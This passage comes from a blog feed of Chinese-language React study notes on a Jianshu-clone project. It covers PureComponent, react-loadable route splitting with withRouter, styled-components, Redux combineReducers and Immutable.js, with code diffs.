class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="deletion">- import React, &#123; Component &#125; from &#x27;react&#x27;</span></span><br><span class="line"><span class="addition">+ import React, &#123; PureComponent &#125; from &#x27;react&#x27;</span></span><br><span class="line">  import &#123; connect &#125; from &#x27;react-redux&#x27;</span><br><span class="line"></span><br><span class="line"><span class="deletion">- class Home extends Component &#123;</span></span><br><span class="line"><span class="addition">+ class Home extends PureComponent &#123;</span></span><br><span class="line">    render() &#123;</span><br><span class="line">      return (</span><br><span class="line">        ... ...</span><br><span class="line">      )</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  const mapState = (state) =&gt; (&#123;</span><br><span class="line">    ... ...</span><br><span class="line">  &#125;)</span><br><span class="line"></span><br><span class="line">  const mapDispatch = (dispatch) =&gt; (&#123;</span><br><span class="line">    ... ...</span><br><span class="line">  &#125;)</span><br><span class="line"></span><br><span class="line">  export default connect(mapState, mapDispatch)(Home);</span><br></pre></td></tr></table></figure><p>注意：PureComponent 与 immutable.js 结合使用才有效</p><h1 id="4-react-loadable的使用"><a href="#4-react-loadable的使用" class="headerlink" title="4. react-loadable的使用"></a>4. react-loadable的使用</h1><p><a href="https://github.com/jamiebuilds/react-loadable">Guide</a></p><p>react-loadable 可以实现异步加载路由，用来优化加载，以修改简书项目中的detail页面为例：</p><ol><li><p>在detail页面的根目录下创建一个 <code>loadable.js</code> 文件：</p> <figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">  /store</span><br><span class="line">  index.js</span><br><span class="line"><span class="addition">+ loadable.js</span></span><br><span class="line">  style.js</span><br></pre></td></tr></table></figure></li><li><p>在 <code>loadable.js</code> 中添加</p> <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="title class_">Loadable</span> <span class="keyword">from</span> <span class="string">&#x27;react-loadable&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="title class_">Loading</span> <span class="keyword">from</span> <span class="string">&#x27;./my-loading-component&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="title class_">LoadableComponent</span> = <span class="title class_">Loadable</span>(&#123;</span><br><span class="line">  <span class="attr">loader</span>: <span class="function">() =&gt;</span> <span class="title function_">import</span>(<span class="string">&#x27;./my-component&#x27;</span>),</span><br><span class="line">  <span class="attr">loading</span>: <span class="title class_">Loading</span>,</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="keyword">class</span> <span class="title class_">App</span> <span class="keyword">extends</span> <span class="title class_ inherited__">React.Component</span> &#123;</span><br><span class="line">  <span class="title function_">render</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="language-xml"><span class="tag">&lt;<span class="name">LoadableComponent</span>/&gt;</span></span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p> 根据需求修改成合适项目的代码：</p> <figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">  import Loadable from &#x27;react-loadable&#x27;;</span><br><span class="line"><span class="deletion">- import Loading from &#x27;./my-loading-component&#x27;;</span></span><br><span class="line"><span class="addition">+ import React from &#x27;react&#x27;; // 获取语法jsx支持</span></span><br><span class="line"></span><br><span class="line">  const LoadableComponent = Loadable(&#123;</span><br><span class="line">    loader: () =&gt; import(&#x27;./my-component&#x27;),</span><br><span class="line"><span class="deletion">-   loading: Loading,</span></span><br><span class="line"><span class="addition">+   loading()&#123;</span></span><br><span class="line"><span class="addition">+     return &lt;div&gt;正在加载&lt;/div&gt;</span></span><br><span class="line"><span class="addition">+   &#125;</span></span><br><span class="line">  &#125;);</span><br><span class="line"></span><br><span class="line"><span class="addition">+ export default () =&gt; &lt;LoadableComponent /&gt; </span></span><br><span class="line"></span><br><span class="line"><span class="deletion">- export default class App extends React.Component &#123;</span></span><br><span class="line"><span class="deletion">-   render() &#123;</span></span><br><span class="line"><span class="deletion">-     return &lt;LoadableComponent/&gt;;</span></span><br><span class="line"><span class="deletion">-   &#125;</span></span><br><span class="line"><span class="deletion">- &#125;</span></span><br></pre></td></tr></table></figure></li><li><p>修改入口文件 <code>App.js</code> 的引入代码</p> <figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="deletion">- import Detail from &#x27;./pages/detail&#x27;;</span></span><br><span class="line"><span class="addition">+ import Detail from &#x27;./pages/detail/loadable.js&#x27;;</span></span><br></pre></td></tr></table></figure></li></ol><h2 id="4-1-处理路由参数"><a href="#4-1-处理路由参数" class="headerlink" title="4.1 处理路由参数"></a>4.1 处理路由参数</h2><p>我们首先要明白 react-loadable 改变了组件的加载方式，由之前直接读取 <code>index.js</code> 加载组件，改变为以读取 <code>loadable.js</code> 然后再异步获取 <code>index.js</code>，返回 <code>&lt;LoadableComponent /&gt;</code> 组件来加载新的页面。</p><p>我们在入口文件 <code>App.js</code> 中将路由传递给了由 <code>loadable.js</code> 导出的组件，也就是说，我们将路由传递给的是 <code>&lt;LoadableComponent /&gt;</code> 组件，而并非 <code>index.js</code> 中导出的组件。所以真正的组件无法获取到路由对象，当我们在组件中使用了 <code>this.props.match</code> 时就会报错。</p><p>这时我们需要改写 <code>index.js</code> 来让真正的组件获取到路由的参数。</p><p>首先要引入 react-router-dom 中提供的 <code>withRouter</code> 方法，这个方法可以让我们渲染出的组件可以读取到当前的路由信息：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; withRouter &#125; <span class="keyword">from</span> <span class="string">&#x27;react-router-dom&#x27;</span></span><br></pre></td></tr></table></figure><p>之后再导出组件时，我们要使用 <code>withRouter</code> 来渲染组件：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="title function_">connect</span>(mapState, mapDispatch)(<span class="title function_">withRouter</span>(<span class="title class_">Detail</span>));</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
          <category> React </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 项目实战 </tag>
            
            <tag> React </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>React学习笔记05：项目实战（一）</title>
      <link href="/2019/05/6b0ae348c366.html"/>
      <url>/2019/05/6b0ae348c366.html</url>
      
        <content type="html"><![CDATA[<p><a href="https://github.com/EsunR/React-Study/tree/master/07-%E9%A1%B9%E7%9B%AE%E5%AE%9E%E6%88%98%EF%BC%9AHeader%E7%BB%84%E4%BB%B6%E7%9A%84%E5%BC%80%E5%8F%91">Githu源代码</a></p><h1 id="1-使用styled-components管理样式"><a href="#1-使用styled-components管理样式" class="headerlink" title="1.使用styled-components管理样式"></a>1.使用styled-components管理样式</h1><p>如果在组件文件中引入一个css文件，那么这个css文件会在全局中生效，也就是说会造成该组件的样式被应用到其他组件上，这时候需要使用 styled-components 来帮助我们管理样式</p><h2 id="1-1-准备环境"><a href="#1-1-准备环境" class="headerlink" title="1.1 准备环境"></a>1.1 准备环境</h2><ol><li><p>安装</p><blockquote><p>yarn add styled-components</p></blockquote></li><li><p>更改<code>style.css</code>为<code>style.js</code>并引入<code>index.js</code></p> <figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">// index.js</span><br><span class="line"><span class="deletion">- import &#x27;./style.css&#x27;;</span></span><br><span class="line"><span class="addition">+ import &#x27;./style.js&#x27;;</span></span><br></pre></td></tr></table></figure></li></ol><h2 id="1-2-使用流程"><a href="#1-2-使用流程" class="headerlink" title="1.2 使用流程"></a>1.2 使用流程</h2><ol><li><p>创建<code>style.js</code>，引入<code>styled-components</code></p> <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> styled <span class="keyword">from</span> <span class="string">&#x27;../../../node_modules/styled-components&#x27;</span>;</span><br></pre></td></tr></table></figure></li><li><p>编写带有样式的组件容器</p> <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> [<span class="title class_">StyleConponentName</span>] = styled.[<span class="title class_">TagName</span>]<span class="string">`</span></span><br><span class="line"><span class="string">  [Style]: [Value]</span></span><br><span class="line"><span class="string">`</span></span><br></pre></td></tr></table></figure><p> 如：</p> <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> <span class="title class_">Nav</span> = styled.<span class="property">div</span><span class="string">`</span></span><br><span class="line"><span class="string">  width: 960px;</span></span><br><span class="line"><span class="string">`</span></span><br></pre></td></tr></table></figure></li><li><p>在组件中调用样式容器</p> <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; [<span class="title class_">StyleConponentName</span>] &#125; <span class="keyword">from</span> <span class="string">&#x27;./style.js&#x27;</span></span><br></pre></td></tr></table></figure> <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">StyleConponentName</span>&gt;</span>Conetne Text Here<span class="tag">&lt;/<span class="name">StyleConponentName</span>&gt;</span></span><br></pre></td></tr></table></figure></li></ol><h2 id="1-3-全局样式的使用"><a href="#1-3-全局样式的使用" class="headerlink" title="1.3 全局样式的使用"></a>1.3 全局样式的使用</h2><p>styled-components 默认只应用于单个组件的样式，但是通过其提供的 <code>createGlobalStyle</code> 方法可以创建全局样式，我们在此以引入字体样式为例，在字体所在的文件夹中创建一个 <code>iconfont.js</code></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// iconfont-.js</span></span><br><span class="line"><span class="keyword">import</span> &#123; createGlobalStyle &#125; <span class="keyword">from</span> <span class="string">&#x27;styled-components&#x27;</span>;</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> <span class="title class_">GlobalStyle</span> = createGlobalStyle<span class="string">`</span></span><br><span class="line"><span class="string">  @font-face &#123;</span></span><br><span class="line"><span class="string">    font-family: &quot;iconfont&quot;;</span></span><br><span class="line"><span class="string">    src: url(&#x27;./iconfont.eot?t=1558516833762&#x27;); /* IE9 */</span></span><br><span class="line"><span class="string">    ... ...</span></span><br><span class="line"><span class="string">  &#125;</span></span><br><span class="line"><span class="string">  .iconfont &#123;</span></span><br><span class="line"><span class="string">    font-family: &quot;iconfont&quot;!important;</span></span><br><span class="line"><span class="string">    font-size: 16px;</span></span><br><span class="line"><span class="string">    font-style: normal;</span></span><br><span class="line"><span class="string">  &#125;</span></span><br><span class="line"><span class="string">`</span></span><br></pre></td></tr></table></figure><p>之后将 <code>iconfont.js</code> 导入到 <code>App.js</code> 中应用于全局：</p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">  import React, &#123; Component &#125; from &#x27;react&#x27;</span><br><span class="line">  ... ...</span><br><span class="line"><span class="addition">+ import &#123; GlobalStyle &#125; from &#x27;./statics/icon-font/iconfont&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  class App extends Component &#123;</span><br><span class="line">    render() &#123;</span><br><span class="line">      return (</span><br><span class="line">        &lt;Provider store=&#123;store&#125;&gt;</span><br><span class="line"><span class="addition">+         &lt;GlobalStyle&gt;&lt;/GlobalStyle&gt;</span></span><br><span class="line">          ... ...</span><br><span class="line">        &lt;/Provider&gt;</span><br><span class="line">      );</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  export default App;</span><br></pre></td></tr></table></figure><p>在此要注意的是，全局样式 <code>&lt;GlobalStyle&gt;&lt;/GlobalStyle&gt;</code> 必须引入到渲染的根节点中，即与组件同级，不能在其内部添加任何组件。</p><h2 id="1-4-子级样式的使用"><a href="#1-4-子级样式的使用" class="headerlink" title="1.4 子级样式的使用"></a>1.4 子级样式的使用</h2><p>如果创建的样式组件需要通过className来判断样式，则使用 <code>&amp;.className&#123;...&#125;</code> 来编写样式，如：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- jsx --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">NavItem</span> <span class="attr">className</span>=<span class="string">&quot;active&quot;</span>&gt;</span>Login<span class="tag">&lt;/<span class="name">NavItem</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// style.js</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> <span class="title class_">NavItem</span> = styled.<span class="property">div</span><span class="string">`</span></span><br><span class="line"><span class="string">  [Style]: [Value];</span></span><br><span class="line"><span class="string">  &amp;.className: &#123;</span></span><br><span class="line"><span class="string">    [Style]: [Value];</span></span><br><span class="line"><span class="string">  &#125;</span></span><br></pre></td></tr></table></figure><h1 id="2-使用combineReducers完成对数据的拆分管理"><a href="#2-使用combineReducers完成对数据的拆分管理" class="headerlink" title="2. 使用combineReducers完成对数据的拆分管理"></a>2. 使用combineReducers完成对数据的拆分管理</h1><p>Reducer主要负责对action的判断和数据的处理以及初始化工作，假如我们把所有组件的操作都放到一个<code>reducer.js</code>文件中去处理，那么可能就会导致代码过长，所以Redux提供了一个 <code>combineReducers()</code> API可以让我们把Reducer拆分到每个组件中，再合并到主要的Reducer文件中。</p><p>目录结构：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">/src</span><br><span class="line">+-- /store</span><br><span class="line">+   +-- index.js</span><br><span class="line">+   +-- reducer.js</span><br><span class="line">+</span><br><span class="line">+-- /common</span><br><span class="line">+   +-- /header</span><br><span class="line">+       +-- index.js</span><br><span class="line">+       +-- style.js</span><br><span class="line">+       +-- /store</span><br><span class="line">+           +-- index.js</span><br><span class="line">+           +-- reducer.js</span><br><span class="line">+</span><br><span class="line">+-- index.js</span><br><span class="line">+-- App.js</span><br><span class="line">+-- style.js</span><br></pre></td></tr></table></figure><p><code>/comon/header</code> 中存放了header组件的的相关信息，我们可以把与该组件有关的store单独写在该目录下的 <code>store</code> 文件夹中。</p><h2 id="2-1-主要步骤"><a href="#2-1-主要步骤" class="headerlink" title="2.1 主要步骤"></a>2.1 主要步骤</h2><ol><li><p>在 <code>/common/header/store/reducer.js</code> 编写关于 <code>header</code> 组件的reducer操作</p> <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> defaultState = &#123;</span><br><span class="line">  [dataName]: [value]</span><br><span class="line">  <span class="comment">// ... ... 处理初始化数据</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> (store = defaultState, action) =&gt; &#123;</span><br><span class="line">  <span class="comment">// ... ... 处理action</span></span><br><span class="line">  <span class="keyword">return</span> store;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p><code>/common/header/store/index.js</code> 作为模块出口导出模块</p> <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> reducer <span class="keyword">from</span> <span class="string">&#x27;./reducer&#x27;</span></span><br><span class="line"><span class="keyword">export</span> &#123; reducer &#125;</span><br></pre></td></tr></table></figure></li><li><p>改写 <code>/store/reducer.js</code>，在此引入 <code>combineReducers</code> 方法，然后将合并好的reducer导出：</p> <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; combineReducers &#125; <span class="keyword">from</span> <span class="string">&#x27;redux&#x27;</span></span><br><span class="line"><span class="keyword">import</span> &#123; reducer <span class="keyword">as</span> <span class="title class_">HeaderReducer</span> &#125; <span class="keyword">from</span> <span class="string">&#x27;../common/header/store&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> reducer = <span class="title function_">combineReducers</span>(&#123;</span><br><span class="line">  <span class="attr">header</span>: <span class="title class_">HeaderReducer</span></span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> reducer</span><br></pre></td></tr></table></figure></li><li><p>如果在组件中调用数据，则需要将原来的 <code>state.[dataName]</code> 改为 <code>state.[componentName].[dataName]</code>，如：</p> <figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">const mapStateToProps = (state) =&gt; &#123;</span><br><span class="line">  return &#123;</span><br><span class="line"><span class="deletion">-   focused: state.focused</span></span><br><span class="line"><span class="addition">+   focused: state.header.focused</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><h2 id="2-2-处理出口文件"><a href="#2-2-处理出口文件" class="headerlink" title="2.2 处理出口文件"></a>2.2 处理出口文件</h2><p>当我们在代码中引入<code>actionCreators.js</code>和<code>constants.js</code>来存放action生成器以及管理变量名时，可以使用已有的<code>index.js</code>统一向外暴露接口。</p><p>目录变更:</p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">  /common</span><br><span class="line">  +-- /header</span><br><span class="line">      +-- index.js</span><br><span class="line">      +-- style.js</span><br><span class="line">      +-- /store</span><br><span class="line">          +-- index.js</span><br><span class="line">          +-- reducer.js</span><br><span class="line"><span class="addition">+         +-- actionCreators.js</span></span><br><span class="line"><span class="addition">+         +-- constants.js</span></span><br></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*   /common/header/store/index.js   */</span></span><br><span class="line"><span class="keyword">import</span> reducer <span class="keyword">from</span> <span class="string">&#x27;./reducer&#x27;</span></span><br><span class="line"><span class="keyword">import</span> * <span class="keyword">as</span> actionCreators <span class="keyword">from</span> <span class="string">&#x27;./actionCreators&#x27;</span></span><br><span class="line"><span class="keyword">import</span> * <span class="keyword">as</span> constants <span class="keyword">from</span> <span class="string">&#x27;./constants&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> &#123; reducer, constants, actionCreators &#125;</span><br></pre></td></tr></table></figure><p>之后如果需要使用相关的action生成器则只需要调用:</p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="deletion">- import * actionCreators from &#x27;./store/actionCreators.js&#x27;;</span></span><br><span class="line"><span class="addition">+ import &#123; actionCreators &#125; from &#x27;./store&#x27;;</span></span><br><span class="line">... ...</span><br><span class="line">const action = actionCreators.searchFocus()</span><br></pre></td></tr></table></figure><h1 id="3-Immutable-js"><a href="#3-Immutable-js" class="headerlink" title="3. Immutable.js"></a>3. Immutable.js</h1><h2 id="3-1-简介"><a href="#3-1-简介" class="headerlink" title="3.1 简介"></a>3.1 简介</h2><p>Immutable.js是用来限制某一个数据为不可变更数据，它将原有的数据转化为一个immutable对象，之后如果想要获取某个immutable对象的值，则使用<code>get()</code>方法。它还提供了一个<code>set()</code>方法，这个方法并没有去修改原有数据的值，而是将原有值与新值结合，返回一个新的对象。</p><p>由于在Redux模型中，Reducer不可以更改state中的数据，只是将一个做了变更的数据交付给Store，由Store去变更数据。在之前的方法中，我们使用深拷贝state来防止变更数据，使用Immutable.js就可以简化操作。</p><p>注意：immutable对象只能使用immutable提供的API，且immutable对象不能与普通的对象混用，必须要进行转换。</p><h2 id="3-2-API"><a href="#3-2-API" class="headerlink" title="3.2 API"></a>3.2 API</h2><h3 id="3-2-1-fromJS-set"><a href="#3-2-1-fromJS-set" class="headerlink" title="3.2.1 fromJS() set()"></a>3.2.1 fromJS() set()</h3><p>利用immutable中的<code>fromJS()</code>可以将一个js对象转化成为一个immutable对象，利用<code>set()</code>方法可以处理immutable对象中的数据：</p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">  import &#123; constants &#125; from &#x27;./index&#x27;</span><br><span class="line"><span class="addition">+ import &#123; fromJS &#125; from &#x27;immutable&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="deletion">- const defaultState = &#123;</span></span><br><span class="line"><span class="deletion">-   focused: false</span></span><br><span class="line"><span class="deletion">- &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">=== 将默认的defaultState转化为一个immutable对象 ===</span></span><br><span class="line"><span class="addition">+ const defaultState = fromJS(&#123;</span></span><br><span class="line"><span class="addition">+   focused: false</span></span><br><span class="line"><span class="addition">+ &#125;)</span></span><br><span class="line"></span><br><span class="line">  export default (state = defaultState, action) =&gt; &#123;</span><br><span class="line">    if (action.type == constants.SEARCH_FOCUE) &#123;</span><br><span class="line"><span class="deletion">-     const newState = JSON.parse(JSON.stringify(state));</span></span><br><span class="line"><span class="deletion">-     newState.focused = true;</span></span><br><span class="line"><span class="deletion">-     return newState;</span></span><br><span class="line"><span class="addition">+     return state.set(&#x27;focused&#x27;, true);</span></span><br><span class="line">    &#125;</span><br><span class="line">    return state;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><h3 id="3-2-2-get"><a href="#3-2-2-get" class="headerlink" title="3.2.2 get()"></a>3.2.2 get()</h3><p>使用<code>get()</code>方法获取一个immutable对象中的数据（此时state中的数据已被转化为一个immutable对象）</p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">const mapStateToProps = (state) =&gt; &#123;</span><br><span class="line">  return &#123;</span><br><span class="line"><span class="deletion">-   focused: state.header.focused</span></span><br><span class="line"><span class="addition">+   focused: state.header.get(&#x27;focused&#x27;)</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="3-2-3-toJS"><a href="#3-2-3-toJS" class="headerlink" title="3.2.3 toJS"></a>3.2.3 toJS</h3><p>作用：将一个Immutable数据转换为JS类型的数据。</p><p>用法：value.toJS()</p><h3 id="3-2-4-List-和-Map"><a href="#3-2-4-List-和-Map" class="headerlink" title="3.2.4 List() 和 Map()"></a>3.2.4 List() 和 Map()</h3><p>作用：用来创建一个新的List/Map对象</p><p>用法:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">//List</span><br><span class="line"></span><br><span class="line">List(): List&lt;any&gt;</span><br><span class="line">List&lt;T&gt;(): List&lt;T&gt;</span><br><span class="line"></span><br><span class="line">//Map</span><br><span class="line"></span><br><span class="line">Map(): Map&lt;any&gt;</span><br><span class="line">Map&lt;T&gt;(): Map&lt;T&gt;</span><br></pre></td></tr></table></figure><h3 id="3-2-5-List-of-和-Map-of"><a href="#3-2-5-List-of-和-Map-of" class="headerlink" title="3.2.5 List.of() 和 Map.of()"></a>3.2.5 List.of() 和 Map.of()</h3><p>作用：创建一个新的包含value的List/Map对象</p><p>用法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">List.of&lt;T&gt;(...values: Array&lt;T&gt;): List&lt;T&gt;</span><br><span class="line"></span><br><span class="line">Map.of&lt;T&gt;(...values: Object&lt;T&gt;): Map&lt;T&gt;</span><br></pre></td></tr></table></figure><h3 id="3-2-6-size"><a href="#3-2-6-size" class="headerlink" title="3.2.6 size"></a>3.2.6 size</h3><p>作用：获取List/Map的长度</p><h2 id="3-3-将Redux中的所有数据都immutable化"><a href="#3-3-将Redux中的所有数据都immutable化" class="headerlink" title="3.3 将Redux中的所有数据都immutable化"></a>3.3 将Redux中的所有数据都immutable化</h2><p>安装<code>redux-immutable</code></p><blockquote><p>yarn add redux-immutable</p></blockquote><p>在项目的主store中引入redux-immutable提供的<code>combineReducers()</code>方法去取代redux提供的<code>combineReducers()</code>方法</p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="deletion">- import &#123; combineReducers &#125; from &#x27;redux&#x27;</span></span><br><span class="line"><span class="addition">+ import &#123; combineReducers &#125; from &#x27;redux-immutable&#x27;</span></span><br></pre></td></tr></table></figure><p>此时就可以在组件中使用 immutable 来规范化数据了</p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">const mapStateToProps = (state) =&gt; &#123;</span><br><span class="line">  return &#123;</span><br><span class="line"><span class="deletion">-   focused: state.header.get(&#x27;focused&#x27;)</span></span><br><span class="line"><span class="addition">+   focused: state.get(&#x27;header&#x27;).get(&#x27;focused&#x27;)</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>也可以利用<code>getIn()</code>方法写为：</p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="deletion">- focused: state.get(&#x27;header&#x27;).get(&#x27;focused&#x27;)</span></span><br><span class="line"><span class="addition">+ focused: state.getIn([&#x27;header&#x27;,&#x27;focused&#x27;])</span></span><br></pre></td></tr></table></figure><h1 id="4-在开发过程中使用假数据"><a href="#4-在开发过程中使用假数据" class="headerlink" title="4. 在开发过程中使用假数据"></a>4. 